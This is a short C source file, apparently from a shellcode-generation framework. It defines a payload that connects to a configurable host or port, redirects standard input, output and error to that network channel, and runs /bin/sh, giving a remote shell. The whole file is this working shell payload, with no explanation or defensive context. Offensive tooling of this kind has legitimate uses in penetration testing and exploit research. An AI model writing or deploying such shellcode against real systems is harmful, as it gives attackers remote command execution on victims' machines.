#include <factory.h>

#include "helpers/process.c"
#include "helpers/io.c"
#include "helpers/socket.c"

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    char *const argv[] = { "/bin/sh", NULL };
#else
    char *const argv[] = { NULL };
#endif
    char *const envp[] = { NULL };

#if defined(HOST) || defined(PORT)
    struct channel chan = get_communication_channel();
    _dup2(chan.rx, 0);
    _dup2(chan.tx, 1);
    _dup2(chan.tx, 2);
#endif

    _execve("/bin/sh", argv, envp); 

} SHELLCODE_END
